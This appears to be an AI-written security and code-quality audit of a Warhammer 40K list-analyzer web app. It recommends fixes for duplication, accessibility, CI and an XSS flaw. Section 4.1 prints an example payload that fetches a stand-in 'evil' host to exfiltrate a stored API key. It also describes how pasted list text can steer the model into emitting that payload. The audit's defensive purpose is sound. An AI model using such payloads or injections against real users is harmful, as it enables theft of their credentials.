# Frontend & Full-Repo Codebase Audit — WH40K List Analyzer

**Scope:** Holistic audit of the entire `List_builder` repository (native HTML/JS front end + Node
back end). **Deliverable:** this report only — no application code was changed. All fixes below are
recommendations for the maintainer to apply.

**Reviewed at commit:** `claude/frontend-codebase-audit-dxqgt5` · ~3.2k LOC (excl. lockfile).

---

## Executive Summary

The project is small, dependency-light, and in several places genuinely well built — the
server-backed front end (`public/index.html`) escapes output, uses `addEventListener`, and runs in
strict mode; the Node core has a real unit-test suite and isolates crawler failures with
`Promise.allSettled`. The dominant structural problem is **duplication**: `docs/index.html` (the
static GitHub Pages build) is a hand-maintained fork of `public/index.html` *and* the Node analysis
modules. The copies have drifted, and one of those drifts is a **live XSS vulnerability**.

### Severity tally

| Severity | Count | Headline items |
| --- | --- | --- |
| **Critical** | 1 | Unescaped `innerHTML` of model output in `docs/index.html` (XSS) |
| **High** | 1 | Global-scope + inline-handler architecture in `docs/index.html` |
| **Medium** | 9 | Pervasive duplication/drift, unverified model id, unlinted front end, CI Playwright download, config false-source-of-truth, semantics/ARIA, separation of concerns |
| **Low** | 8 | Cached DOM lookups, entity-decode ordering, dedup gap, dead import, rate-limiter scope, stale faction cache, SERP key in URL, vacuous test |

### Prioritized fix roadmap

- **P0 — Security:** escape model output in `docs/index.html` (adopt the existing `esc()` from `public`).
- **P1 — Kill the duplication class:** generate `docs/index.html` from shared ES modules + a template
  via `build-pages.js` instead of hand-maintaining a fork. This removes ~8 duplicated units at once,
  including the render logic whose drift *is* the XSS.
- **P2 — Hygiene:** centralize & verify the model id, lint `public/`+`docs/`, skip the Playwright
  browser download in the test CI job, and wire (or delete) the unused `config.json` keys.

---

# Part A — Frontend

## 1. JavaScript Quality & Modern Standards

### 1.1 Global scope pollution + classic script — `docs/index.html:194-629`
1. **File(s) & Location:** `docs/index.html:194-629` (the whole `<script>`).
2. **Current Implementation:** A classic (non-module) script. Every function (`openSettings`,
   `saveKey`, `analyze`, `renderResults`, …) and mutable state (`let factionsWithRealData`) is a
   global on `window`, because the HTML wires behavior through inline `onclick=` attributes that
   require global symbols.
3. **The Problem:** Global namespace pollution, collision risk, no encapsulation, and it forces the
   inline-handler anti-pattern (see 3.2). The sibling file `public/index.html` already demonstrates
   the better pattern (`'use strict'`, cached element refs, `addEventListener`).
4. **Proposed Solution:**
   ```html
   <script type="module">
     // strict by default; nothing leaks to window
     const els = {
       analyzeBtn: document.getElementById('analyzeBtn'),
       results:    document.getElementById('results'),
       // …
     };
     function openSettings() { /* … */ }
     document.querySelector('.gear-btn').addEventListener('click', openSettings);
   </script>
   ```
5. **Impact:** **High** — maintainability & correctness foundation; also unblocks 3.2.

### 1.2 Missing `'use strict'` — `docs/index.html`
1. **Location:** top of `docs/index.html` script vs `public/index.html:139`.
2. **Current:** No strict-mode directive; `public/index.html` has `'use strict';`.
3. **Problem:** Silent-error footguns (accidental globals, etc.).
4. **Solution:** Converting to `<script type="module">` (1.1) makes it strict automatically; otherwise add `'use strict';`.
5. **Impact:** **Low** (subsumed by 1.1).

### 1.3 Prompt/JSON logic duplicated & drifted — `docs/index.html:415-487`
1. **Location:** `docs/index.html:415-487` vs `list-analyzer.js:45-186`.
2. **Current:** `buildSystemPrompt`, `buildUserMessage`, and `extractJSON` are near-verbatim
   re-implementations of the Node versions.
3. **Problem:** DRY violation; the copies have **already drifted** (e.g. RULE 4 in the Node system
   prompt adds *"Only reference units/detachments present in the provided tournament data"*, absent
   from the browser copy). Two behaviors from "one" prompt.
4. **Solution:** Extract a browser-safe ES module, e.g. `shared/prompt.js`, consumed by both the Node
   layer and the generated `docs` page (see the P1 build-generation recommendation in §8).
5. **Impact:** **Medium.**

### 1.4 Unverified / stale model id — `docs/index.html:528` (+3 more)
1. **Location:** `docs/index.html:528`, `list-analyzer.js:190`, `server.js:78`, `config.json:13`.
2. **Current:** `model: 'claude-sonnet-4-6'` hardcoded in four places.
3. **Problem:** `claude-sonnet-4-6` does not match a known valid model id — **verify against the
   current model list before shipping**; an invalid id yields a 404 from the API. It is also
   duplicated four times, so a correction means four edits.
4. **Solution:** Verify the id, then centralize it (single `config.json` value read by the server, and
   injected into the generated `docs` page at build time).
5. **Impact:** **Medium** (potential hard failure of the core feature).

## 2. DOM Manipulation & Performance

### 2.1 Repeated `getElementById` lookups — `docs/index.html` (throughout)
1. **Location:** `analyze()`, `renderResults()`, `setLoading()`, `checkReady()`, `updateApiKeyStatus()`.
2. **Current:** The same elements (`#results`, `#analyzeBtn`, `#errorBox`, `#spinner`, `#factionSelect`,
   `#listText`) are re-queried on every call.
3. **Problem:** Redundant DOM traversal and verbose code. `public/index.html:142-147` already caches
   these once in module-scope `const`s.
4. **Solution:**
   ```js
   const analyzeBtn = document.getElementById('analyzeBtn');
   const results    = document.getElementById('results');
   // reuse the cached refs everywhere
   ```
5. **Impact:** **Low/Medium.**

### 2.2 Multiple `innerHTML` writes per render — `docs/index.html:575-606`
1. **Location:** `renderResults()` sets `#scoreBadge`, `#metaContext`, `#strengthsList`,
   `#weaknessesList`, `#comparisonList`, `#recommendations` in separate assignments.
2. **Current:** ~6 separate `innerHTML`/`textContent` writes into distinct nodes.
3. **Problem:** Several style/layout recalculations; also the unescaped writes are the XSS (§4.1).
   `public/index.html:241` builds one escaped template string and writes once.
4. **Solution:** Build a single escaped template and assign once (or use DOM builders + `textContent`).
5. **Impact:** **Low** (perf) / rolls into **Critical** via §4.1.

### 2.3 Asset loading — both HTML files
1. **Location:** `docs/index.html`, `public/index.html`.
2. **Current:** All CSS and JS is inlined in one document; scripts sit at end of `<body>`.
3. **Problem:** Fine at this size — no `defer`/`async` needed with end-of-body scripts. Note only that
   the inlined CSS is byte-for-byte duplicated across the two files (see §8), and that externalizing
   JS later would want `defer`.
4. **Solution:** No action now; if code is externalized, use `<script defer src="app.js">`.
5. **Impact:** **Low.**

## 3. Architecture & Clean HTML

### 3.1 Non-semantic markup & missing ARIA — both HTML files
1. **Location:** `docs/index.html:103-192`, `public/index.html:89-136`.
2. **Current:** Layout is built from `<div class="card">` / `<div class="modal">`; the settings modal
   is a `<div class="modal-overlay">`; async regions (`#spinner`, `#errorBox`, `#results`) have no
   live-region semantics.
3. **Problem:** Weaker document outline and reduced accessibility — screen readers are not told when
   analysis starts, errors appear, or results arrive.
4. **Solution:**
   ```html
   <section aria-labelledby="input-heading"> … </section>
   <dialog id="settingsModal"> … </dialog>        <!-- native modal, Esc + focus trap for free -->
   <div id="spinner" role="status" aria-live="polite"> … </div>
   <div id="errorBox" role="alert"> … </div>
   ```
5. **Impact:** **Medium.**

### 3.2 Separation of concerns — inline handlers & inline styles
1. **Location:** inline handlers `docs/index.html:100,105,110,111,154` (`onclick=`); inline styles
   `docs/index.html:131,184,586`, `public/index.html:108,132,253`.
2. **Current:** Behavior is attached via HTML attributes; presentation via `style="…"` attributes.
3. **Problem:** Mixes structure/behavior/presentation; `onclick` requires the global functions from
   §1.1. `public/index.html` already avoids inline handlers — bring `docs` up to the same bar.
4. **Solution:** Wire events with `addEventListener`; move inline styles to CSS utility classes
   (e.g. `.muted-note`, `.mt-8`).
5. **Impact:** **Medium.**

## 4. Security & Error Handling

### 4.1 🔴 XSS via unescaped `innerHTML` of model output — `docs/index.html:575,584-599`
1. **File(s) & Location:** `docs/index.html:575` (`scoreBadge.innerHTML`) and `584-599`
   (`metaContext`, `strengthsList`, `weaknessesList`, `comparisonList`, `recommendations`).
2. **Current Implementation:**
   ```js
   badge.innerHTML = `<div class="score-num">${score}</div><div class="score-label">${score_label || ''}</div>`;
   document.getElementById('strengthsList').innerHTML = strengths.map((s) => `<li>${s}</li>`).join('');
   recEl.innerHTML = recommendations.map((rec, i) =>
     `<div class="rec-card">…<div class="rec-text">${rec}</div></div>`).join('');
   ```
   Model-returned fields (`score_label`, `strengths[]`, `weaknesses[]`, `comparison_points[]`,
   `recommendations[]`, `meta_explanation`) are interpolated into `innerHTML` **without escaping**.
3. **The Problem:** The model output is attacker-influenceable — the user pastes arbitrary army-list
   text that becomes part of the prompt, and the JSON fields are echoed straight into the DOM. A
   crafted list can coerce a payload such as `<img src=x onerror="fetch('//evil/?k='+sessionStorage.anthropic_key)">`
   into a strength/recommendation string, which then executes in the page — the same page that holds
   the user's Anthropic API key in `sessionStorage`. This is a real key-exfiltration path.
   `public/index.html` **already solves this** with an `esc()` helper (`public/index.html:161-163`)
   applied to every interpolation; `docs` simply never adopted it.
4. **Proposed Solution & Code Snippet:**
   ```js
   const esc = (s) => String(s)
     .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');

   badge.innerHTML =
     `<div class="score-num">${esc(score)}</div><div class="score-label">${esc(score_label || '')}</div>`;
   strengthsList.innerHTML = strengths.map((s) => `<li>${esc(s)}</li>`).join('');
   ```
   Better still, delete this function entirely and generate `docs` from the already-safe `public`
   render code (§8).
5. **Impact:** **High (Critical)** — stored/reflected XSS with credential-theft potential.

### 4.2 Missing response-shape validation before render — `docs/index.html:543-548`
1. **Location:** `docs/index.html:543-548`, `renderResults` consumers.
2. **Current:** After `extractJSON`, the result is passed to `renderResults` without validating that
   `score` is an integer 1–10 or that the array fields exist before `.map`.
3. **Problem:** A malformed (but parseable) response renders `undefined`/`NaN` into the UI instead of
   a graceful message. (The network layer itself is solid — `AbortController` 90s timeout,
   status-specific 401/429 messaging.)
4. **Solution:** Add a small guard, e.g. `if (typeof result.score !== 'number') return showError('Malformed analysis — please retry.');`
   and default arrays (`strengths = []`) as `public` largely does.
5. **Impact:** **Low/Medium.**

### 4.3 Silent manifest fetch failure — `docs/index.html:341-346`
1. **Location:** `docs/index.html:341-346`.
2. **Current:** `catch (_) { /* no manifest — all factions use mock data */ }`.
3. **Problem:** Intentional and documented — acceptable. Noted only for completeness; consider a
   `console.debug` breadcrumb to aid debugging.
4. **Impact:** **Low** (informational).

---

# Part B — Backend

## 5. Server (`server.js`)

### 5.1 In-memory rate limiter — `server.js:32-51`
1. **Location:** `server.js:32-51`.
2. **Current:** `rateLimitMap` is a per-process `Map`; a sweep interval evicts expired entries.
3. **Problem:** State is per-instance — it resets on restart and does not coordinate across multiple
   replicas, so the effective limit multiplies behind a load balancer. Fine for a single node.
4. **Solution:** For multi-instance deployment, back it with a shared store (e.g. `express-rate-limit`
   + a Redis store). Otherwise document the single-node assumption.
5. **Impact:** **Low** (scaling only).

### 5.2 `factionsCache` never invalidated — `server.js:20-26,54,95`
1. **Location:** `server.js:20-26` (build), `54` (serve), `95` (warm at boot).
2. **Current:** Faction list counts are computed once at startup and cached forever. The boot log even
   says *"restart server after running a crawl to refresh list counts."*
3. **Problem:** After a crawl updates `output/*.json`, the running server serves stale counts until a
   manual restart.
4. **Solution:** Add a short TTL or an `fs.watch` on `output/` to invalidate `factionsCache`.
5. **Impact:** **Low.**

### 5.3 ✅ Strong request handling (positive) — `server.js:28,58-90`
`express.json({ limit: '64kb' })`, explicit input validation, edition whitelist, and status-specific
error mapping (400/401/429/503, JSON 404 for `/api/*` before the SPA catch-all) are all done well.
**Keep.**

## 6. Analysis Core & Crawler

### 6.1 Duplicated helpers across crawler sources — `serp.js`, `goonhammer.js`, `listhammer.js`
> **✅ Resolved** — the shared helpers were consolidated into `crawler/lib/html.js`, and the per-site
> scrapers were subsequently removed entirely when the crawler moved to SerpAPI-only gathering
> (`serp.js` is now the sole source and imports everything from `crawler/lib/html.js`).
1. **Location:** `crawler/sources/serp.js:7-50`, `crawler/sources/goonhammer.js:5-48`,
   `crawler/sources/listhammer.js:6-17`.
2. **Current:** `sleep`, `detectEdition`, `EDITION_CUTOFF`, `MIN_UNITS`/`MIN_POINTS`, `isValidListBlock`,
   `extractTextFromHtml`, `extractPreCodeBlocks` are copy-pasted between sources (`extractTextFromHtml`
   in `goonhammer` even decodes one more entity — `&quot;` — than `serp`, i.e. already drifted).
3. **Problem:** DRY violation; behavior can silently diverge between sources.
4. **Solution:** Hoist shared helpers into `utils.js` (or a new `crawler/lib/html.js`) and import them.
5. **Impact:** **Medium.**

### 6.2 Incorrectly-ordered HTML-entity decode — `serp.js:29-40`, `goonhammer.js:19-31`
> **✅ Resolved** — the consolidated `extractTextFromHtml` in `crawler/lib/html.js` decodes `&amp;`
> last, as recommended below.
1. **Location:** `extractTextFromHtml`.
2. **Current:** Replaces `&nbsp;` then `&amp;` then `&lt;`/`&gt;`. Because `&amp;` is decoded before
   `&lt;`/`&gt;`, an input like `&amp;lt;` becomes `&lt;` then `<` — double-decoding.
3. **Problem:** Corrupts army-list text containing literal escaped entities; minor data-quality bug.
4. **Solution:** Use a single entity-map pass, or decode `&amp;` **last**:
   ```js
   .replace(/&nbsp;/g,' ').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&quot;/g,'"').replace(/&amp;/g,'&')
   ```
5. **Impact:** **Low.**

### 6.3 `extractJSON` duplicated — `list-analyzer.js:45-58` vs `docs/index.html:479-487`
Same DRY root cause as §1.3; consolidate into the shared module. **Medium.**

### 6.4 Anonymous short lists bypass dedup — `crawler/merger.js:74-94`
1. **Location:** `crawler/merger.js:74-94`.
2. **Current:** Entries with no player and no event get a guaranteed-unique key (`__anon__${size}`) so
   they all reach the secondary pass; the hash pass only dedupes entries whose parsed
   `units.length >= 3`, and pushes everything else through unconditionally.
3. **Problem:** Two identical anonymous lists with <3 parseable units are never deduplicated. Real-world
   impact is small (source filters require ≥5 units / ≥500 pts), but the gap is worth documenting.
4. **Solution:** Fall the short-list branch through a hash check too, or hash on normalized full text
   regardless of unit count.
5. **Impact:** **Low.**

### 6.5 Dead import — `crawler/sources/bcp.js:3`
> **✅ Resolved by removal** — `bcp.js` was deleted along with the other per-site scrapers.
1. **Location:** `crawler/sources/bcp.js:3`.
2. **Current:** `const { extractDetachment } = require('../../utils');` — never used (the fetcher is a
   stub that returns `[]`).
3. **Problem:** Dead code; only a lint `warn` because `no-unused-vars` is set to `'warn'`.
4. **Solution:** Remove the import (and consider tightening the rule to `error`).
5. **Impact:** **Low.**

### 6.6 Scraping anti-bot evasion — `listhammer.js:34-39` (advisory)
> **✅ Resolved by removal** — `listhammer.js`, `bcp.js`, and `tabletop-to.js` were deleted; the
> crawler now discovers pages via SerpAPI and fetches them with plain HTTP (no browser automation,
> no evasion techniques, no Playwright runtime dependency).
1. **Location:** `crawler/sources/listhammer.js:34-39`, plus ToS warnings at `crawler/index.js:40-41`
   and header comments in `bcp.js` / `tabletop-to.js`.
2. **Current:** The crawler spoofs `navigator.webdriver`, fakes `plugins`/`languages`, injects
   `window.chrome`, and waits out Cloudflare challenges.
3. **The Problem (neutral/advisory):** This is bot-detection evasion. The code already carries
   Terms-of-Service warnings, and BCP/Tabletop.to are disabled by default in `config.json`
   (`enabledSources` omits them). Beyond the ToS/legal question, these techniques are **brittle** —
   selector- and challenge-dependent scraping breaks whenever the target site changes, which is a
   maintenance cost. Flagged as advisory, not a code defect.
4. **Solution:** Prefer official/permitted data sources where available; keep ToS-risky sources
   opt-in; isolate the evasion logic so breakage is contained.
5. **Impact:** **Medium (advisory).**

### 6.7 SerpAPI key in URL query string — `serp.js:88`
> **Status: accepted constraint** — SerpAPI only accepts the key as a query parameter, so the
> mitigation stands: the request URL is never logged, and error messages are scrubbed of the key
> before logging (covered by a test in `tests/test-crawler-serp.js`).
1. **Location:** `crawler/sources/serp.js:88`.
2. **Current:** `…&api_key=${apiKey}` embedded in the request URL.
3. **Problem:** Secrets in URLs can leak via proxy logs, referrers, and error traces. (The query text
   is logged at `serp.js:89`, not the key — but the URL itself still carries it.)
4. **Solution:** Send the key via header if SerpAPI supports it; otherwise ensure the full URL is never
   logged.
5. **Impact:** **Low.**

---

# Part C — Config, Build & CI

## 7. Configuration, Build & CI

### 7.1 `config.json` is a partial false source of truth — `config.json`
1. **Location:** `config.json:5-14`.
2. **Current:** `defaultDelay`, `jsRenderWait`, `cfChallengeWait`, `serpCacheTTLDays`,
   `editionCutoffDate`, and `aiAnalysis.defaultModel` are defined but **never read**. The code
   hardcodes equivalents: `EDITION_CUTOFF = new Date('2025-08-01')` in three source files,
   `CACHE_TTL_DAYS = 7` in `serp.js:10`, model id in `list-analyzer.js`/`server.js`.
3. **Problem:** Editing `config.json` gives a false sense of control; real behavior lives in scattered
   constants that can (and do) drift from the config.
4. **Solution:** Wire these keys through to the code (single read at startup), or delete the unused keys
   to avoid misleading maintainers.
5. **Impact:** **Medium.**

### 7.2 `postinstall` downloads a browser on every install — `package.json:25`
> **✅ Resolved** — the `postinstall` script was removed and `playwright` dropped to a
> devDependency (kept only as the driver for the optional `test:e2e` docs smoke test, which uses a
> preinstalled Chromium). No install path downloads a browser anymore.
1. **Location:** `package.json:25` — `"postinstall": "playwright install chromium --with-deps"`.
2. **Current:** Runs on every `npm ci`, including the **test** CI job (`.github/workflows/test.yml`),
   which only runs `node --test` and never launches a browser.
3. **Problem:** Slows CI, and `--with-deps` needs root/sudo. The browser is only needed by the crawl
   job (`crawl-deploy.yml`).
4. **Solution:** Remove the unconditional `postinstall`; install the browser explicitly only where
   needed (crawl job), and set `PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD=1` for the test job:
   ```yaml
   # test.yml
   - run: npm ci
     env: { PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD: '1' }
   ```
5. **Impact:** **Medium.**

### 7.3 Front-end JS is entirely unlinted — `eslint.config.mjs:26`
1. **Location:** `eslint.config.mjs:26` — `ignores: ['node_modules/','output/','public/','docs/']`.
2. **Current:** ESLint ignores `public/` and `docs/`, so **the browser code — where the §4.1 XSS
   lives — gets zero static analysis.**
3. **Problem:** The most security-sensitive code is exempt from linting; a `no-unsanitized`-style rule
   would have flagged the raw `innerHTML`.
4. **Solution:** Add a second flat-config block for browser files (script blocks are hard to lint
   inline, so this pairs naturally with externalizing/generating the JS):
   ```js
   { files: ['public/**/*.js','docs/**/*.js'],
     languageOptions: { globals: { document:'readonly', window:'readonly', fetch:'readonly', sessionStorage:'readonly' }, sourceType:'module' } }
   ```
5. **Impact:** **Medium.**

### 7.4 Vacuous test — `tests/test-crawler-merger.js:130-158`
> **✅ Resolved by removal** — the `bcp` stub and its vacuous test were deleted; the serp source now
> has real fetcher-level coverage in `tests/test-crawler-serp.js`.
1. **Location:** `tests/test-crawler-merger.js:130-158`.
2. **Current:** The `bcp createFetcher` test builds an elaborate mock page, but `bcp.js` is a stub that
   always returns `[]`, so the `if (result.length > 0) { …assertions… }` block never runs.
3. **Problem:** The test asserts almost nothing (only `Array.isArray`); it reads as covered but isn't.
4. **Solution:** Either test the real parsing once `bcp` is implemented, or assert the documented
   empty-return contract explicitly (`assert.deepEqual(result, [])`).
5. **Impact:** **Low.**

### 7.5 ✅ CI & test positives
`node --test` gives meaningful coverage of `merger` and `list-analyzer`; `Promise.allSettled`
(`crawler/index.js:78`) isolates per-source crawler failures; CI runs lint + tests on `main` and
`claude/**`. **Keep.**

---

## 8. Redundancy / DRY Inventory  *(the repo's central issue)*

**Root cause:** `docs/index.html` is a **hand-maintained fork** of `public/index.html` *plus* the Node
analysis modules (`list-analyzer.js`, `mock-tournament-data.js`). Every shared structure is copied,
and several copies have already drifted — including the render logic, whose drift is the §4.1 XSS.

| Duplicated unit | Locations | Drift status |
| --- | --- | --- |
| `MOCK_DATA` + `getMockData` | `mock-tournament-data.js` ↔ `docs/index.html:226-332` | **Drifted** — docs has 7 keys vs 8, fewer units per entry, missing `chaos-space-marines-10ed` |
| `SUPPORTED_FACTIONS` (26) | `list-analyzer.js:8` ↔ `docs/index.html:196` ↔ `config.json` `factionPatterns` ↔ `crawl-deploy.yml` inputs | Enumerated in **4 places** — adding a faction means 4 edits |
| `buildSystemPrompt`/`buildUserMessage` | `list-analyzer.js:116-186` ↔ `docs/index.html:415-476` | **Drifted** (RULE 4 wording differs) |
| `extractJSON` | `list-analyzer.js:45-58` ↔ `docs/index.html:479-487` | near-identical |
| `scoreBand` | `public/index.html:153` ↔ `docs/index.html:559` | identical |
| `<style>` block (~70 lines) | `public/index.html:7-77` ↔ `docs/index.html:7-91` | identical core (+ docs-only modal styles) |
| `renderResults`/`setLoading`/`showError`/`hideError` | `public/index.html` ↔ `docs/index.html` | **Drifted** — `public` escapes output, `docs` does not → **this drift is the XSS** |
| Crawler helpers (`sleep`, `detectEdition`, `EDITION_CUTOFF`, `MIN_UNITS`/`MIN_POINTS`, `extractTextFromHtml`, `extractPreCodeBlocks`, `isValidListBlock`) | `serp.js` ↔ `goonhammer.js` ↔ `listhammer.js` | **✅ Resolved** — consolidated into `crawler/lib/html.js`; per-site scrapers removed (SerpAPI-only crawler) |

**Single high-leverage fix:** treat `public/index.html`'s escaped render logic + a shared
`SUPPORTED_FACTIONS`/`MOCK_DATA`/prompt module as the source of truth, and **generate
`docs/index.html` in `build-pages.js`** (it already runs at deploy time — `crawl-deploy.yml:74-76`).
The only real difference between the two front ends is the transport (`docs` calls
`api.anthropic.com` directly with a session key; `public` calls `/api/analyze`), which is a small
branch, not a reason to fork the entire file. This one change removes ~8 duplicated units and
structurally prevents the escaping drift from recurring.

---

## 9. What's Already Good

- `public/index.html` escapes all output (`esc`), caches DOM refs, uses `addEventListener`, and runs
  in strict mode — a clean reference implementation.
- Solid async patterns in both front ends: `AbortController` timeouts, status-specific error messages.
- Server input validation, body-size limits, and a JSON 404 before the SPA catch-all.
- Real unit tests for the merger and analyzer; crawler fault isolation via `Promise.allSettled`.
- Dependency-light, framework-free, readable code with a consistent style.

---

*Report only — no source files were modified. Line numbers reference the repository state at the time
of audit; re-verify before applying fixes.*
